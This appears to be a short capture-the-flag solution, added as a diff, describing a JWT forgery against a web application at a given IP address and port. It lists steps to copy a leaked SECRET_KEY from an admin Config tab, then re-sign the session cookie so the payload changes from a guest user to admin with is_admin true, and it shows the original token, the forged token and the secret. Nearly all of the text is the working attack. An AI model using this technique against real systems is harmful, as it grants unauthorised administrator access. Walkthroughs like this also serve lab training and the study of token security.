@@ -1,0 +1,55 @@
+1 . Vist : http://128.199.104.41:25506/admin
+2 . Goto tab 'Config'
+3 . Copy SECRET_KEY : 'wanjir-itu-secret-nya-cuk-cepet-copy-3efbb717'
+4 . Copy jwt from Cookies : http://128.199.104.41:25506/
+5 . Modif jwt : https://jwt.io/
+
+[-] BEFORE
+jwt = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTcwMTkxMjIsImlhdCI6MTU5NzAxNzMyMiwic3ViIjp7ImlkIjoyLCJ1c2VybmFtZSI6Imd1ZXN0IiwiaXNfYWRtaW4iOiJmYWxzZSJ9fQ.OifBmjUoqgWW4s1OrtXHiVW7H6HzzhgSPrJWUbtmTr8
+
+[HEADER]
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+[PAYLOAD]
+{
+  "exp": 1597019122,
+  "iat": 1597017322,
+  "sub": {
+    "id": 2,
+    "username": "guest",
+    "is_admin": "false"
+  }
+}
+[VERIFY SIGNATURE]
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+
+)
+
+[+] AFTER
+jwt = eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1OTcwMTg4NjgsImlhdCI6MTU5NzAxNzA2OCwic3ViIjp7ImlkIjozLCJ1c2VybmFtZSI6ImFkbWluIiwiaXNfYWRtaW4iOiJ0cnVlIn19.O2E5AhO7OKS_IRDdVWzh9YO1NtWrxjnBj-9Jz_Axv-w
+
+[HEADER]
+{
+  "typ": "JWT",
+  "alg": "HS256"
+}
+[PAYLOAD]
+{
+  "exp": 1597018868,
+  "iat": 1597017068,
+  "sub": {
+    "id": 3,
+    "username": "admin",
+    "is_admin": "true"
+  }
+}
+[VERIFY SIGNATURE]
+HMACSHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  wanjir-itu-secret-nya-cuk-cepet-copy-3efbb717
+)
